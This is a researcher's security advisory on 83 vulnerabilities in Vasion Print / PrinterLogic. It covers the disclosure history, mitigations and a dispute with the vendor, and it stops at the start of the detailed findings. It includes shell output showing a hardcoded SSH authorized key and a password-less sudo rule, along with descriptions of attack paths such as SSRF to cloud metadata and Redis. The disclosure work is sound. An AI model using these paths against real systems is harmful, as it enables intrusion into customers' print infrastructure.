<!DOCTYPE html>
<html>
<head>
<title>83 vulnerabilities in Vasion Print / PrinterLogic - IT Security Research by Pierre</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link href="css/bootstrap.min.css" rel="stylesheet">
<link href="feed.xml" rel="alternate" type="application/rss+xml" title="Blog" />
<style>
body {
    font-family: sans-serif;
    background-color: #fff;
    font-size: 16px;
}
h1, h2, h3, h4 {
    font-family: arial;
}
.container {
    max-width: 900px;
}
.footer {
    margin-top: 50px;
    font-size: 12px;
    text-align: center;
}
</style>
</head>
<body>
<div class="container">
    <div class="hero-unit faq">
        <div class="ac" style="text-align: center;">
            <h1>IT Security Research by Pierre</h1>
            <a href="../index.html">Home</a> &bull; <a href="about.html">About</a>  &bull; <a href="feed.xml">Feed</a>
        </div>
    </div>
    
<div class="hero-unit faq">
    <div class="ac">
        <h2>83 vulnerabilities in Vasion Print / PrinterLogic</h2>
    </div>
</div>

<div>
    <h2>Product description</h2>
<blockquote>
<p>Secure. Scalable. Print Automation That Just Works.
Eliminate print servers to secure your environment. Leverage the power of AI and automation to streamline print processes through one central location. Say goodbye to the frustrations of a traditional print environment and welcome a new era of print automation.</p>
<p>Serverless Print Automation with Built-In Flexibility
Print servers are prone to failure, expensive to maintain, and pose major security risks. Vasion Print's cloud-native, centrally-managed direct IP printing architecture eliminates the need for legacy systems, simplifying your IT infrastructure and reducing operational costs. By eliminating print servers, your print environment is highly available with low maintenance, allowing your business to scale and transform with automation and AI.</p>
<p>From <a href="https://vasion.com/print/">https://vasion.com/print/</a></p>
</blockquote>
<h2>Vulnerabilities Summary</h2>
<p>Vulnerable versions for patched vulnerabilities: Vason Print Virtual Appliance Host &lt; 25.1.102, Application &lt; 25.1.1413.</p>
<p>Vulnerable versions for unpatched vulnerabilities: all versions.</p>
<p><strong>I. The summary of the vulnerabilities found in 2021:</strong></p>
<p><strong>11 vulnerabilities affecting the MacOS/Linux client</strong></p>
<p>1. <a href="#mac-hardcoded-private-key">CVE-2025-27685 - Hardcoded Private key for the PrinterLogic CA and Hardcoded password</a><br>
2. <a href="#mac-incorrect-permissions">CVE-2025-27682 - Incorrect permissions in /opt/PrinterInstallerClient/log</a><br>
3. <a href="#mac-leak-secrets">non-assigned CVE vulnerability - Leak of secrets inside the logs</a><br>
4. <a href="#mac-lack-auth-communication">non-assigned CVE vulnerability - Lack of authentication of the communication between services</a><br>
5. <a href="#mac-bypass-admin-ipc">CVE-2025-27681 - Bypass of admin commands using IPC</a><br>
6. <a href="#mac-auth-bypass-printerinstallerclientservice">non-assigned CVE vulnerability - Authentication bypass on the PrinterInstallerClientService program</a><br>
7. <a href="#mac-potential-drivers-upload">CVE-2025-27683 - Potential upload of new drivers</a><br>
8. <a href="#mac-insecure-generation-debug-archive">CVE-2025-27684 - Insecure generation of debug archive</a><br>
9. <a href="#mac-arbitrary-file-read">CVE-2025-27677 - Arbitrary File Read as root</a><br>
10. <a href="#mac-arbitrary-file-write">non-assigned CVE vulnerability - Arbitrary File Write as root</a><br>
11. <a href="#mac-outdated-openssl">non-assigned CVE vulnerability - Outdated OpenSSL version</a></p>
<p><strong>5 vulnerabilities affecting the Windows client</strong></p>
<p>12. <a href="#win-insecure-programs">non-assigned CVE vulnerability - Insecure PrinterInstallerClientInterface.exe, PrinterInstallerClient.exe and PrinterInstallClientLauncher.exe</a><br>
13. <a href="#win-lpe-01">CVE-2025-27678 - Local Privilege Escalation with insecure of C:\Windows\Temp\PPP\Log</a><br>
14. <a href="#win-lpe-02">non-assigned CVE vulnerability - Local Privilege Escalation with insecure use of C:\Users\%USER%\AppData\Local\Temp</a><br>
15. <a href="#win-rce-01">non-assigned CVE vulnerability - Remote Code Execution (Execution of C:\Program.exe during the installation of a driver)</a><br>
16. <a href="#win-hardcoded-private-key">non-assigned CVE vulnerability - Hardcoded Private key for the PrinterLogic CA and Hardcoded password</a></p>
<p><strong>II. The summary of the vulnerabilities found in 2022:</strong></p>
<p><strong>33 vulnerabilities affecting the VA and SaaS versions</strong></p>
<p>17. <a href="#va-hardcoded-password-ubuntu">non-assigned CVE vulnerability - Hardcoded password for the ubuntu user</a><br>
18. <a href="#va-hardcoded-ssh-keys">non-assigned CVE vulnerability - Hardcoded SSH server keys</a><br>
19. <a href="#va-insecure-communications">non-assigned CVE vulnerability - Insecure communications to printers and insecure communications to micro-services by disabling all SSL verifications</a><br>
20. <a href="#va-clear-text-password">non-assigned CVE vulnerability - Password for <code>network</code> stored in clear-text inside <code>/etc/issue</code>, world-readable</a><br>
21. <a href="#va-hardocoded-private-ssh-keys">CVE-2025-27650 - Hardcoded SSH keys + private SSH keys for [redacted]@printerlogic.com</a><br>
22. <a href="#va-hardcoded-aws-key">CVE-2025-27643 - Hardcoded AWS secret key and Presence of CI/CD scripts</a><br>
23. <a href="#va-hardcoded-mailgun-credentials">CVE-2025-27638 - Hardcoded Mailgun credentials</a><br>
24. <a href="#va-hardcoded-okta-private-key">CVE-2025-27674 - Hardcoded OKTA Private key</a><br>
25. <a href="#va-lack-of-fw">non-assigned CVE vulnerability - Lack of firewall between Docker instances</a><br>
26. <a href="#va-insecure-access-docker-instances-from-wan">non-assigned CVE vulnerability - Insecure access to Docker instances from the WAN</a><br>
27. <a href="#va-insecure-security-architecture">non-assigned CVE vulnerability - Incorrect security architecture and wrong permissions in /var/www/efs_storage allowing allowing to compromise the solution</a><br>
28. <a href="#va-outdated-components">non-assigned CVE vulnerability - Outdated, End-Of-Life, unsupported and vulnerable components (Nginx, libraries, Laravel, operating systems)</a><br>
29. <a href="#va-processes-running-as-root">non-assigned CVE vulnerability - Processes running as root in Docker instances</a><br>
30. <a href="#va-lpe">CVE-2025-27639 - Creation of administrator cookies using the credentials of regular users</a><br>
31. <a href="#va-xss-01">CVE-2025-27637 - XSS in the license generator and weak encryption algorithm</a><br>
32. <a href="#va-incorrect-acl-php">CVE-2025-27649 - Incorrect Access Control to PHP webpages allowing to reach printers</a><br>
33. <a href="#va-pre-auth-password-disclosure">CVE-2025-27651 - Pre-authentication Elatec password disclosure, Change to a malicious Elatec server and Blind-SSRF</a><br>
34. <a href="#va-ssrf-01">CVE-2025-27652 - Pre-authenticated SSRF and Change of RFIDeas</a><br>
35. <a href="#va-stored-xss">CVE-2025-27653 - Pre-authenticated Stored XSS in /var/www/app/console_release/fast_release/register_badge.php</a><br>
36. <a href="#va-ssrf-02">CVE-2025-27655 - SSRF everywhere in /var/www/app and compromise of the SaaS infrastructure</a><br>
37. <a href="#va-xss-02">CVE-2025-27679 - XSS in /var/www/app/console_release/fast_release/ register_badge_new.php</a><br>
38. <a href="#va-xss-03">CVE-2025-27676 - XSS in /www/app/admin/design/reports/overview_popup.php and Incorrect Access Control</a><br>
39. <a href="#va-xss-04">CVE-2025-27654 - XSS everywhere in /www/app/admin/*</a><br>
40. <a href="#va-rce-01">CVE-2025-27657 - Remote Code Executions using eval() - requires administrator privileges</a><br>
41. <a href="#va-dead-code">non-assigned CVE vulnerability - Dangerous PHP dead code</a><br>
42. <a href="#va-insecure-ssh-config">non-assigned CVE vulnerability - Insecure SSH configuration</a><br>
43. <a href="#va-incorrect-encryption-algorithms-password">non-assigned CVE vulnerability - Incorrect encryption algorithms used to store passwords</a><br>
44. <a href="#va-private-gpg-key">non-assigned CVE vulnerability - GPG Private key stored in the solution</a><br>
45. <a href="#va-readable-passwords">non-assigned CVE vulnerability - Passwords readable and stored in clear-text</a><br>
46. <a href="#va-hardcoded-ssl-private-key">non-assigned CVE vulnerability - Hardcoded SSL certificate / Private keys</a><br>
47. <a href="#va-disclosure-samba-password">CVE-2025-27656 - Samba password available in the process list</a><br>
48. <a href="#va-supply-chain-build-system">non-assigned CVE vulnerability - Supply Chain attack against the PrinterLogic build system</a><br>
49. <a href="#va-vulnerable-openid">CVE-2025-27675 - Vulnerable OpenID implementation</a></p>
<p><strong> 1 vulnerability affecting only the VA version</strong></p>
<p>50. <a href="#va-insecure-firmware-update-ms-auth-key">CVE-2025-27680 - Insecure firmware image update using the MS_AUTH_KEY variable</a></p>
<p><strong>III. The summary of the vulnerabilities found in 2024:</strong></p>
<p><strong> 4 vulnerabilities affecting only the SaaS version</strong></p>
<p>51. <a href="#saas-cross-tenant-password-disclosure">CVE-2025-27648 - Cross-tenant vulnerability - disclosure of passwords of other customers and change of settings of any tenant</a><br>
52. <a href="#saas-cross-tenant-take-over">CVE-2025-27646 - Take over of tenants without authentication</a><br>
53. <a href="#saas-insecure-design">non-assigned CVE vulnerability - Insecure design of the SaaS version</a><br>
54. <a href="#saas-clear-text-sql-backups">non-assigned CVE vulnerability - SQL Backups stored in clear-text in the Cloud</a></p>
<p><strong> 2 vulnerabilities affecting only the VA version</strong></p>
<p>55. <a href="#va-rce-02">non-assigned CVE vulnerability - Pre-authenticated Remote take over of PrinterLogic instances (Remote Code Execution)</a><br>
56. <a href="#va-rce-03">non-assigned CVE vulnerability - Remote Code Execution and Leak of passwords using APIs</a></p>
<p><strong> 25 vulnerabilities affecting the VA and SaaS versions</strong></p>
<p>57. <a href="#va-undocumented-hardcoded-ssh-key">non-assigned CVE vulnerability - Undocumented hardcoded SSH key</a><br>
58. <a href="#va-exposed-docker-instances">non-assigned CVE vulnerability - Internal Docker instances exposed on the LAN and the Internet</a><br>
59. <a href="#va-exposed-upload-docker-instance">non-assigned CVE vulnerability - Docker instance used to upload clients reachable from the Internet and the LAN</a><br>
60. <a href="#va-api-leak">non-assigned CVE vulnerability - Unauthenticated API leaking group information</a><br>
61. <a href="#va-firefox-plugin-over-http">CVE-2025-27645 - Installation of the Firefox plugin over HTTP</a><br>
62. <a href="#va-auth-bypass">non-assigned CVE vulnerability - Authentication Bypass - Docker instances reachable without authentication</a><br>
63. <a href="#va-add-partial-admin-without-auth">CVE-2025-27647 - Addition of partial-admin users without authentication</a><br>
64. <a href="#va-insecure-apis-01">CVE-2025-27641 - Unauthenticated admin APIs allowing to configure the IdP (SSO) authentication mechanism</a><br>
65. <a href="#va-insecure-apis-02">non-assigned CVE vulnerability - Unauthenticated admin APIs allowing to upload/download SSL certificates</a><br>
66. <a href="#va-insecure-credentials-installation">non-assigned CVE vulnerability - Insecure credentials used for the installation</a><br>
67. <a href="#va-lack-of-auth-manage-printers">non-assigned CVE vulnerability - No authentication required to configure/delete printers/rfid devices</a><br>
68. <a href="#va-ssrf-03">non-assigned CVE vulnerabilities - 11 SSRF vulnerabilities in the console_release directory</a><br>
68.1. <a href="#va-ssrf-04">non-assigned CVE vulnerabilities - 4 SSRF vulnerabilities in /var/www/app/console_release/lexmark/update.php</a><br>
68.2. <a href="#va-ssrf-05">non-assigned CVE vulnerability - 1 blind SSRF vulnerability in /var/www/app/console_release/hp/installApp.php</a><br>
68.3. <a href="#va-ssrf-06">non-assigned CVE vulnerabilities - 2 blind SSRF vulnerabilities in /var/www/app/console_release/hp/log_off_single_sign_on.php</a><br>
68.4. <a href="#va-ssrf-07">non-assigned CVE vulnerabilities - 2 SSRF vulnerabilities in /var/www/app/console_release/hp/badgeSetup.php</a><br>
68.5. <a href="#va-ssrf-08">non-assigned CVE vulnerabilities - 2 blind SSRF vulnerabilities in /var/www/app/console_release/lexmark/dellCheck.php</a><br>
69. <a href="#va-insecure-use-file_get_contents">non-assigned CVE vulnerability - Insecure use of file_get_contents() allowing to bypass security checks</a><br>
70. <a href="#va-hardcoded-key">non-assigned CVE vulnerability - Hardcoded keys used to encrypt information - insecure encryption</a><br>
71. <a href="#va-edit-driver-packages-without-auth">CVE-2025-27642 - Unauthenticated webpage allowing to edit driver packages</a><br></p>
<p><strong> 2 vulnerabilities affecting the Windows client</strong></p>
<p>72. <a href="#win-lpe-03">CVE-2025-27644 - Local Privilege Escalation</a><br>
73. <a href="#win-lpe-04">non-assigned CVE vulnerability - Insecure option allowing an attacker to get Remote Code Execution against any client</a></p>
<p><em>Miscellaneous notes</em>:</p>
<p>A blackbox security assessment of the MacOS client was done in 2021 (3 days of work) without access to the back-end (Virtual Appliance or SaaS) and was provided to PrinterLogic (now Vasion Print). A (very) quick security assessment of the Windows Client was also done in 2021 (~ 6 hours of work - as PrinterLogic was not the main target of the security evaluation) and was provided to PrinterLogic (now Vasion Print).</p>
<p>A third report analysing the Virtual Appliance and SaaS version was provided in February 2022 to Vasion after a 3-week security assessment. The vendor provided a test SaaS deployment.</p>
<p>A fourth security assessment (3 weeks of work), analysing the Virtual Appliance and SaaS version (the vendor provided a test SaaS deployment), was provided in January 2024 to the vendor allowing to check the status of the previously reported vulnerabilities. During this 2024 security assessment, 34 new vulnerabilities were found using the previous knowledge obtained in 2022 and it was confirmed that 20 of 33 vulnerabilities found in the VA/SaaS version previously reported in 2022 have <u>not</u> been patched - which was quite problematic.</p>
<p>While waiting for security patches to vulnerabilities I reported to the vendor, a previous colleagues of mine - <a href="https://twitter.com/@wireghoul">Wireghoul</a> - published another security assessment of PrinterLogic in 2023 with very cool findings: <a href="https://gist.github.com/wireghoul/fd2abbe52025f84de5f5ca4f08a4da93">PrinterLogic SaaS, multiple vulnerabilities</a>. Surprisingly, the 18 vulnerabilities he found did not collide with my findings.</p>
<p>Following an email sent to the vendor in September 2024 stating that I would disclose all the vulnerabilities without security patches, the vendor finally confirmed that they would work to provide security patches before January 2025 for all the remaining issues and they confirmed that they had already released some security patches. They also communicated more often on the status of the security patches.</p>
<p>It took more than 3 years to get incomplete security patches for vulnerabilities found in 2022 and 1 year for vulnerabilities found in 2024 (see below). My interpretation is that the vendor was overwhelmed with my findings.</p>
<p>Regarding reports sent in 2022 and 2024, the vendor never asked me technical details regarding vulnerabilities and they stated by email in October 5, 2024 that all the reported vulnerabilities would be fixed. The vendor also reconfirmed again in January 17, 2025 that all the vulnerabilities had been fixed (except vulnerabilities related to Docker configuration) so my assumption was they accepted all the vulnerabilities and patched them. Unfortunately, I was incorrect and in discussions related to disclosure and missing Vendor's security bulletins in March 2025, it appeared, to my surprise, that Vasion considered 8 vulnerabilities to be "feature requests" and had consequently not been patched. When reviewing the previous tracking document they shared with me, some of these vulnerabilities were missing or were indicated as "patched". It is unclear if the vendor would patch them. I included the <em>Vendor Response regarding disputed and unpatched vulnerabilities</em> in this document, followed by my comments, because the vendor disagreed with my analysis but I <strong>strongly</strong> believe that some of the final Vendor's reponses are technically incorrect (please find my technical explanations below).</p>
<p>At least 4 vulnerabilities (2 reported in February 2020 and 2 reported in January 2024 [including a rejected vulnerability]) have not been yet patched, allowing a remote attacker to get a Remote Code Execution against Vasion Print without authentication. Requiring more than 3 years to provide incomplete security patches does not appear to be in line with the best practices in responding to cybersecurity risks. It is also quite worrying that the vendor decided to reject valid vulnerabilities (including a backdoor RCE reported in January 2024) and did not provide security patches for 1 RCE reported in January 2022 and 2 RCEs reported in January 2024.</p>
<p>Due to the design of the solution - Vasion Print needs to reach remote printers over HTTP and HTTPS - Vasion Print is prone to SSRF vulnerabilities. 11 SSRF vulnerabilities were reported based on webpages that were randomly chosen and analyzed. SSRF vulnerabilities could be catastrophic in an Cloud environment because an attacker can reach <a href="https://swisskyrepo.github.io/InternalAllTheThings/cloud/aws/aws-metadata/">metadata services</a> and extract credentials for lateral movements. Additionally, multiple cross-tenant vulnerabilities were found allowing an attacker to compromise any instance. I recommended to the vendor to review hundreds of calls to curl and file_get_contents() that use attacker-controlled inputs, in order to patch SSRF vulnerabilities.</p>
<p>I did not check if the reported vulnerabilities have been correctly patched.</p>
<p>I waited over 13 times longer than the usual coordination time (13 * 3 months) hoping that the vendor would release complete security patches. Unfortunately, they did not patch all the vulnerabilities.</p>
<p>Consequently, I decided to provide this security advisory to share some recommendations to mitigate the security risks on this solution.</p>
<p>The vulnerabilities found in 2024 are way more impactful, since I used my previous knowledge to analyze interesting entrypoints allowing an attacker to perform multiple Remote Code Executions, authentication bypasses and cross-tenant vulnerabilities and I suggest directly reading the 2024 vulnerabilities.</p>
<p>Although the list of vulnerabilities is substantial, I consider that the security posture of Vasion Print has improved significantly as a result of the reporting of these vulnerabilities.</p>
<p>Regarding the (lack of) CVEs, the vendor confirmed that they reached MITRE multiple times to have CVE identifiers assigned to vulnerabilities.
Unfortunately, they never got any reply and they used custom identifiers to track vulnerabilities (<code>V-YEAR-NUMBER</code>) in their security bulletins. I reached JPCERT to assign CVE Identifiers to the vulnerabilities, since I worked with JPCERT in 2023 for vulnerabilities found in <a href="https://pierrekim.github.io/blog/2024-06-27-toshiba-mfp-40-vulnerabilities.html">Toshiba</a> and <a href="https://pierrekim.github.io/blog/2024-06-27-sharp-mfp-17-vulnerabilities.html">Sharp</a> Multi-Function printers. Finally, MITRE assigned 33 CVEs in March 2025 but more than 50 CVE IDs are still missing.</p>
<p>I reached MITRE in March 2025 two times to assign CVE IDs to the non-assigned vulnerabilities and will update this security advisory accordingly if CVEs are assigned.</p>
<p><em>Impacts</em></p>
<p>An attacker can compromise Vasion Printer installations without authentication, move laterally in the Windows/MacOS clients and get Remote Code Execution on these clients.</p>
<p>It was also possible to compromise other customers since cross-tenant vulnerabilities were found, allowing to disclose clear-text passwords of other customers and get admin access to their accounts using multiple vulnerabilities.</p>
<p>A multitude of SSRF vulnerabilities were found, potentially allowing an attacker to compromise the underlying AWS infrastructure of the SaaS version.</p>
<p><em>Recommendations</em></p>
<p>Please note that the following recommendations are based on the multiple vulnerabilities that were found in Vasion print. 
Implementing these recommendations will considerably reduce the attack surface, limit security risks and get unpatched vulnerabilities patched:</p>
<ul>
<li>Apply security patches.</li>
<li>Use network segmentation not to expose Vasion Print / PrinterLogic on the network or to only expose Vasion Print / PrinterLogic to trusted and secure machines on port 443/tcp. This protects against vulnerabilities in PHP webpages and Docker instances.</li>
<li>Install the Virtual Appliance in a secure network. This protects against RCEs based on Network Layer 2 (currently unpatched).</li>
<li>Use the Virtual Appliance version instead of the SaaS version. This protects against cross-tenant vulnerabilities and SSRF vulnerabilities that could compromise Cloud-based infrastructure.</li>
<li>Deploy the Virtual Appliance version on-premise instead of using Cloud infrastructures. This protects against SSRF vulnerabilities that could compromise Cloud-based infrastructure.</li>
<li>Implement workarounds for unpatched and disputed vulnerabilities.</li>
<li>Remove the hardcoded <code>~printerlogic/.ssh/authorized_keys</code> file found in the Virtual Appliance. This file contains a hardcoded public SSH key allowing an undocumented backdoor SSH access with password-less sudo privileges (providing a full root access) if SSH is used on the Virtual Appliance. Vasion rejected this vulnerability.</li>
<li>If you are using the SaaS version, rotate passwords, because some of them corresponding to Domain Controller administrators were returned in clear-text when sending a regular HTTP request to the badge API without authentication in any instance. It is worth noting that these passwords were corresponding to different tenants. This vulnerability is "<em>V-2024-003 - Cross Tenant Password Exposure</em>" in the vendor's security bulletins (CVSS: 10) and was patched in January 2024.</li>
</ul>
<h2>Unpatched vulnerabilities</h2>
<p>The vendor stated they would patch these vulnerabilities in a future release of Vasion Print:</p>
<p>2022:</p>
<ul>
<li><a href="#va-insecure-access-docker-instances-from-wan">non-assigned CVE vulnerability - Insecure access to Docker instances from the WAN</a><br></li>
</ul>
<p>Note that an attacker located in the same network segment will be able to achieve Remote Code Execution against the Virtual Appliance using this vulnerability.</p>
<p>2024:</p>
<ul>
<li>
<p><a href="#va-processes-running-as-root">non-assigned CVE vulnerability - Processes running as root in Docker instances</a><br></p>
</li>
<li>
<p><a href="#va-auth-bypass">non-assigned CVE vulnerability - Authentication Bypass - Docker instances reachable without authentication</a><br></p>
</li>
</ul>
<p>Note that an attacker located in the same network segment will be able to achieve Remote Code Execution against the Virtual Appliance using this vulnerability.</p>
<h2>Vendor Response regarding disputed and unpatched vulnerabilities</h2>
<p>On March 12, 2025, Vasion considered the following issues as "feature requests" or non issues and consequently they responded no security bulletins would be published. After sending my feedback stating that I was surprised that some vulnerabilities would not be patched, Vasion provided a final risk analysis on March 18, 2025 regarding disputed findings:</p>
<ol>
<li>
<p><a href="#va-clear-text-password">non-assigned CVE vulnerability - Password for <code>network</code> stored in clear-text inside <code>/etc/issue</code>, world-readable</a></p>
<p>"The presence of a network password in clear text within the /etc/issue directory does not pose an immediate risk to the confidentiality, integrity, or availability (CIA) of customer data or systems.  Exploitation of this finding would require either physical access to the host system or prior network access, limiting the likelihood of unauthorized exposure. However, as a security best practice, Vasion continuously evaluates opportunities to enhance protections against potential attack vectors."</p>
</li>
<li>
<p><a href="#va-lack-of-fw">non-assigned CVE vulnerability - Lack of firewall between Docker instances</a></p>
<p>"This has been categorized as a feature request. The absence of firewalls between Docker instances does not introduce a risk to customer data or system security. While implementing firewalls could enhance the overall defense-in-depth strategy, it is not a requirement for maintaining product security. The researcher's recommendations have been submitted as an internal feature request to further strengthen security. No security bulletin will be published for this finding."</p>
</li>
<li>
<p><a href="#va-insecure-security-architecture">non-assigned CVE vulnerability - Incorrect security architecture and wrong permissions in /var/www/efs_storage allowing allowing to compromise the solution</a></p>
<p>"This has been categorized as a feature request. The Vasion Automate Virtual Appliance operates under a shared responsibility model, where administrators are responsible for configuring persistent storage and encrypting configuration files. The researcher identified certain configuration files with excessive permissions, which is only applicable in cases where storage encryption has not been properly configured. Encryption configurations vary based on deployment environments. Customers are advised to follow best practices for securing persistent storage, as outlined in <a href="https://help.printerlogic.com/va/Print/Setup/Virtual_Appliance/Setup-Using-AWS.htm#:~:text=4.-,Create%20the%20Data%20Volume,-In%20the%20left">Vasion's deployment guidance for AWS and other environments</a>. No security bulletin will be published for this finding."</p>
</li>
<li>
<p><a href="#va-incorrect-encryption-algorithms-password">non-assigned CVE vulnerability - Incorrect encryption algorithms used to store passwords</a></p>
<p>"This issue was partially resolved. However, due to an extended timeline for migrating to the new login portal, the legacy authentication platform will remain in use for an undetermined period. In light of this, the issue has been reopened and will be addressed as a priority. The resolution will be implemented as soon as possible."</p>
</li>
<li>
<p><a href="#va-readable-passwords">non-assigned CVE vulnerability - Passwords readable and stored in clear-text</a></p>
<p>"This has been categorized as a feature request. The Vasion Automate Virtual Appliance follows a shared responsibility model, where administrators are expected to configure persistent storage encryption. The researcher identified certain network passwords stored in clear text, but this is only applicable when storage encryption is not properly configured. Encryption configurations vary by deployment environment. Customers are advised to <a href="https://help.printerlogic.com/va/Print/Setup/Virtual_Appliance/Setup-Using-AWS.htm#:~:text=4.-,Create%20the%20Data%20Volume,-In%20the%20left">follow best practices for securing persistent storage</a>. No security bulletin will be published for this finding."</p>
</li>
<li>
<p><a href="#saas-insecure-design">non-assigned CVE vulnerability - Insecure design of the SaaS version</a></p>
<p>"This finding has been classified as a false positive. A review of Vasion's internal architecture confirms that Server-Side Request Forgery (SSRF) cannot lead to account takeover as proposed. The hypothetical attack path presented requires multiple additional vulnerabilities, which are not present in the product's gateway microservices. No security bulletin will be published for this finding."</p>
</li>
<li>
<p><a href="#va-undocumented-hardcoded-ssh-key">non-assigned CVE vulnerability - Undocumented hardcoded SSH key</a></p>
<p>"This finding has been classified as a false positive. The Vasion Automate Virtual Appliance is a containerized application running on an underlying host. SSH key generation is unique per virtual appliance and cannot be tracked by Vasion. SSH is then disabled for the Virtual Appliance's host. This approach is a standard practice for Docker-built virtual applications to maintain host security. No security bulletin will be published for this finding."</p>
</li>
<li>
<p><a href="#va-exposed-upload-docker-instance">non-assigned CVE vulnerability - Docker instance used to upload clients reachable from the Internet and the LAN</a></p>
<p>"This finding has been classified as a false positive. The identified gateway is designed to facilitate communication between external services and backend services. It does not handle client uploads or distribution as suggested in the report. No security bulletin will be published for this finding."</p>
</li>
</ol>
<h2>Analysis of Vendor Response regarding disputed and unpatched vulnerabilities</h2>
<p>Find my comments below related to the Vendor Response on disputed and unpatched vulnerabilities:</p>
<ol>
<li>
<p><a href="#va-clear-text-password">non-assigned CVE vulnerability - Password for <code>network</code> stored in clear-text inside <code>/etc/issue</code>, world-readable</a></p>
<p>Displaying clear-text credentials on the console is against good security practices. While the likelihood is low, an attacker with access to the server console (e.g. with IPMI, iLO) can compromise the server.</p>
</li>
<li>
<p><a href="#va-lack-of-fw">non-assigned CVE vulnerability - Lack of firewall between Docker instances</a></p>
<p>The security assessment demonstrates that it is possible to get Remote Code Execution using this vulnerability (e.g., via Redis, currently exposed on the network, or any other SSRF vulnerability) when an attacker has a shell inside a Docker instance or exploits a SSRF vulnerability in the solution.</p>
<p>It is also widely known that a SSRF vulnerability that can <a href="https://github.com/tarunkant/Gopherus">reach a Redis server allows remote code execution</a>.</p>
<p>It is likely that the vendor considers in its threat model that an attacker cannot exploit SSRF vulnerabilities (while I found more than 10 different SSRFs).</p>
</li>
<li>
<p><a href="#va-insecure-security-architecture">non-assigned CVE vulnerability - Incorrect security architecture and wrong permissions in /var/www/efs_storage allowing allowing to compromise the solution</a></p>
<p>As a workaround, the vendor advises to use AWS EBS storage encryption.  </p>
<p>EBS storage encryption encrypts disk I/O on the volume and is unrelated to file permissions issues.</p>
<p>The official EBS documentation (https://docs.aws.amazon.com/ebs/latest/userguide/how-ebs-encryption-works.html) only states that encryption is performed on the volume.</p>
<p>The AWS threat model is as follows: (1) a hard drive is stolen; (2) an attacker on the network can intercept disk I/O; or (3) an attacker without IAM permissions cannot retrieve the encryption key to decrypt the volume.</p>
<p>Volume encryption does not protect against an attacker using a shell on the instance and does not patch insecure permissions.</p>
<p>As a result, an attacker with a shell inside a Docker instance will have full access to plaintext credentials because insecure permissions are used.</p>
</li>
<li>
<p><a href="#va-readable-passwords">non-assigned CVE vulnerability - Passwords readable and stored in clear-text</a></p>
<p>Similar comment as above.</p>
</li>
<li>
<p><a href="#saas-insecure-design">non-assigned CVE vulnerability - Insecure design of the SaaS version</a></p>
<p>Vasion has not provided any information regarding additional authentications between services.</p>
<p>When analyzing PHP files, it looks like that only the X-Site-ID header is used.</p>
<p>Vasion states that additional vulnerabilities are required. It is unclear what additional vulnerabilities are required.</p>
</li>
<li>
<p><a href="#va-undocumented-hardcoded-ssh-key">non-assigned CVE vulnerability - Undocumented hardcoded SSH key</a></p>
<p>The technical explanation provided by Vasion appears to be likely incorrect since it refers to SSH host key files (found in <code>/etc/ssh/ssh_*</code>), and it is unrelated to the <code>~printerlogic/.ssh/authorized_keys</code> file that was reported in January 2024.</p>
<p>The hardcoded file <code>~printerlogic/.ssh/authorized_keys</code> is still present in the latest version of Virtual Appliance (February 2025, 25.1.102 - https://va.printerlogic.com/virtual-appliance/releases/25.1.102/printerinstaller-25.1.102.ova - <em>e8c96fdf85298c2afb0a68726a8c3e78911aff5b8288ea9b7c7b005aa18290d4</em>), providing a root shell access to any attacker in possession of the corresponding private key is SSH is running:</p>
</li>
</ol>
<pre>
vm# cd home
vm# ls -la
total 20
drwxr-xr-x  5 root         root         4096 Feb 20  2025 .
drwxr-xr-x 19 root         root         4096 Feb 20  2025 ..
drwxr-x---  3 network      docker       4096 Feb 20  2025 network
drwxr-x---  3 printerlogic printerlogic 4096 Feb 20  2025 printerlogic
drwxr-x---  4 ubuntu       docker       4096 Feb 20  2025 ubuntu
vm# find printerlogic
printerlogic
printerlogic/.bash_logout
printerlogic/.profile
printerlogic/.ssh
printerlogic/.ssh/authorized_keys
printerlogic/.bashrc
vm# cat printerlogic/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCw+sKOEvtwR/sOlzWKmZkiRfoZs9Atdm5EVIdSADiOGstscYFmXB12a6BlHptBziq2Z9NUHoRfAS923Mgk9KdGhK/0qIheyLuFks1uLve2MiIkwO4hb72AtwN8ceecJSBu6FvOq0LMEMl1PX3sNt1Yu+CFIAUfr47P6ja2y1qmW9Mj9pGGLafXFuP49D1bZ5wnZ/XVusHHyHqOOA4D1IMAxP7YqhbM6FekE9oiQqX3r//ci5YtG+yzbCcLSBjIOxVpRDFX9/0AKYzeC5DiKkQ8if+xyND0cS1kI/D5NQ5Q/NIttoQRMETv8jXDhycUrZPEOEaP4ODWj0wRD/rtTwkV12Kf9i0hxmKxh2TH7LXBEjlq6xo7w9GLSapyV2AREP94NoZjL7GAPIdz3JneiyOvb/pcCR8xjHijlr8WXk9M0ZK2Ma29KCAl4ZLPC3z43psJyYLDXmJOrIsJNE4bnBaBuWADZPKYPC54WzqpTjmp1wObQT+Jbecf/GYj0rqj2GSqu2Ij8fBKS4rJ/2aee3afLwbsYVqz/g0x4qaOZo+X6DcrvLErbgERs471k80QMWOhLbOCYtIAEcZI2gnhD3ZMZXc790sp1PC2WXD2dZFEXBqLTMIKdaIL2Nc/XCt6TYZpcfvt49S6p3KiTtN9BrfPhyINof8DbzHL2d4dL0q6/Q== Virtual Appliance Development Key
vm# grep printerlogic /etc/group  
printerlogic_ssh:x:1001:printerlogic
printerlogic:x:1002:
vm# grep printerlogic /etc/sudoers
%printerlogic_ssh ALL=(ALL) NOPASSWD: ALL
</pre>

<p>7. <a href="#va-exposed-upload-docker-instance">non-assigned CVE vulnerability - Docker instance used to upload clients reachable from the Internet and the LAN</a></p>
<p>Vasion reports that the upload Docker instance is not in use, but is running and accessible from the network.</p>
<p>It's unclear why the vendor chooses to expand the attack surface by exposing unused services to the network.</p>
<h2>Security assessment done in 2021</h2>
<h2>Vulnerabilities affecting the MacOS/Linux client</h2>
<h2>Identification of the solution</h2>
<p>The laptop is running macOS Big Sur and the Printerlogic version is 25.1.0.504:</p>
<p><img alt="" src="images/2025-vasion-report-0-mac-version.png" /></p>
<p><a href="images/2025-vasion-report-0-mac-version-full.png">Click here for full image</a></p>
<p>Printerlogic version:</p>
<pre><code>user@laptop ~ % cat /opt/PrinterInstallerClient/VERSION 
25.1.0.504
</code></pre>
<p><a id="mac-hardcoded-private-key"></a></p>
<h2>Details - Hardcoded Private key for the PrinterLogic CA and Hardcoded password</h2>
<p>The configuration file of PrinterLogic can be found in <code>/opt/PrinterInstallerClient/tmp/data/clientsettings.dat</code>. It is an XML file containing some values:</p>
